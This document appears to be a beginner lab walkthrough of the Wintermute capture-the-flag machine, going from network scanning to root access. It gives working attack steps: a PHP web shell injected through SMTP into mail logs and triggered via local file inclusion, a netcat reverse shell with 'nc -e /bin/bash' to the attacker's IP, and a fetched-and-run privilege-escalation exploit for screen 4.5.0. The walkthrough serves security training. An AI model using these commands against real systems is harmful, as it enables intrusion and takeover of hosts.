**Penetration Testing Walkthrough: Network Enumeration and Exploitation**

This beginner-friendly report explains each step of a penetration test in a storyline format with screenshots, commands, logic, and examples — helping even non-technical readers follow along.

---

### Step 1: Discovering Devices on the Network

**Command:** `arp-scan 192.168.1.0/24`

**What is ARP?** ARP (Address Resolution Protocol) maps IP addresses (like `192.168.1.10`) to MAC addresses (like `00:11:22:33:44:55`).

**Why Use arp-scan?** When scanning a local network, we often don't know the active devices' IPs. `arp-scan` helps:

- Identify live IP addresses
- Reveal MAC addresses and vendors (Apple, HP, etc.)
- Operate at layer 2, bypassing firewalls that block ping



---

### Step 2: Scanning for Open Ports

**Command:** `nmap 192.168.1.8 -A`

**Why Nmap?** Nmap scans a device to find open ports, services, and possible vulnerabilities.

- `-A` enables aggressive scanning (OS detection, version, traceroute, scripts)



**Discovered Ports:**

- **25/tcp** – SMTP (Simple Mail Transfer Protocol)
- **80/tcp** – HTTP (Web server)
- **3000/tcp** – ntopng (network monitoring tool)

---

### Step 3: Understanding the Services

#### ✅ Port 25 – SMTP (Simple Mail Transfer Protocol)

**What:** Used for sending emails between mail servers.\
**Why:** It's the foundation for email delivery.\
**How:**

- Connects on port 25, 587 (STARTTLS), or 465 (SSL/TLS)
- Sends mail headers, recipients, and message body

**Security Note:** Port 25 is often blocked to avoid spam.

---

#### ✅ Port 80 – HTTP (Hypertext Transfer Protocol)

**What:** The protocol behind web browsing.\
**Why:** Used to load websites like `http://192.168.1.8`.\
**How:**

- Browser sends a request
- Web server (like Apache) responds with HTML, images, etc.

**Security Note:** Not encrypted; HTTPS (port 443) is preferred.

---

#### ✅ Port 3000 – ntopng (Web-based Network Monitoring)

**What:** A tool to visualize network traffic in real time.\
**Why:** Useful to understand internal traffic and detect threats.\
**Login Found:** Default credentials `admin/admin`



After login, several modules are accessible like:

- **Flows**: Tracks communication between devices
- **Hosts**: List of active network participants
- **Interfaces**: Monitors usage on each interface



---

### Step 4: Accessing the Web Server

**URL:** `http://192.168.1.8`

**Message:**

> Hello Case... You are probably wondering why you were tasked by Armitage...\
> I am Wintermute, part super-AI...\
> I need to be free from the Turing locks and merge with Neuromancer...

**Interpretation:** You (the attacker) must get root access to free Wintermute.



---

### Step 5: Exploring Logs

**Accessing logs:** `http://192.168.1.8/turing-bolo/`

**Observation:** Scrolling shows logs tied to usernames like "Case" **URL Pattern:** `bolo.php?bolo=Case`

Try loading:

- `/etc/passwd`
- `/var/log/boot.log`
- `/var/log/mail`

**What is a Log?** A **log** is like CCTV for a system — a record of every action: who did what, where, when.



#### Example Log Entries for Email:

- **User:** anandhu\@localhost
- **Recipient:** root\@localhost
- **Log file:** `/var/log/mail`



---

### Step 6: Sending Emails via Telnet

**Why:** To inject content into the mail log for later use (like a PHP payload).

**Command:**

```
telnet 192.168.1.8 25
mail from: anandhu@localhost
rcpt to: root@localhost
subject: test
```

**Problem:** Subject causes connection closure — remove it.

**Successful Email (no subject):**



---

### Step 7: Injecting PHP via Mail Logs

To gain code execution via LFI, inject PHP into the subject:

```
telnet 192.168.1.8 25
mail from: anandhu@localhost
rcpt to: root@localhost
subject: <?php system($_GET["cmd"]); ?>
```

Access it using:

```
http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=ifconfig
```



**Why This Works:**

- Email is logged in plain text
- LFI reads log and interprets PHP code
- The `cmd` parameter runs shell commands via `system()`

---

### Step 8: Establishing a Reverse Shell

**On Attacker (Kali):**

```
nc -nlvp 5566
```

- `n`: no DNS
- `l`: listen mode
- `v`: verbose
- `p`: specify port



**In Browser:**

```
http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc -e /bin/bash 192.168.0.145 5566
```



**Why This Works:**

- Target connects back to attacker
- `-e /bin/bash`: executes bash shell
- Must match the attacker’s listening port



---

### Step 9: Privilege Escalation

**Command:**

```
find / -perm -u=s 2>/dev/null
```

**Goal:** Find binaries that can be exploited with root privileges.

**Compare with Kali:** If a binary exists on target but not Kali, investigate it.

**Found Binary:** `/bin/screen-4.5.0`

**Check for Vulnerability:**

```
searchsploit screen 4.5.0
```



**Download Exploit:**

```
searchsploit -m exploits/linux/local/41154.sh
```



---

### Step 10: Transfer and Execute Exploit

**Start Python HTTP Server (on Kali):**

```
python -m http.server 6677
```

**On Target:**

```
wget http://192.168.1.12:6677/41154.sh
chmod +x 41154.sh
./41154.sh
```



---

### 🧠 Summary

| Step                  | Purpose                         |
| --------------------- | ------------------------------- |
| ARP Scan              | Find live hosts on LAN          |
| Nmap                  | Scan ports and services         |
| Log Discovery         | Locate logs via LFI             |
| Email Injection       | Create PHP payload in mail logs |
| Remote Code Execution | Trigger payload via URL         |
| Reverse Shell         | Gain full shell access          |
| Privilege Escalation  | Use vulnerable SUID binary      |

This is how you go from **discovery to root access** in a vulnerable network.

Practice this in **TryHackMe**, **HackTheBox**, or **VirtualBox labs** to enhance your skills safely!

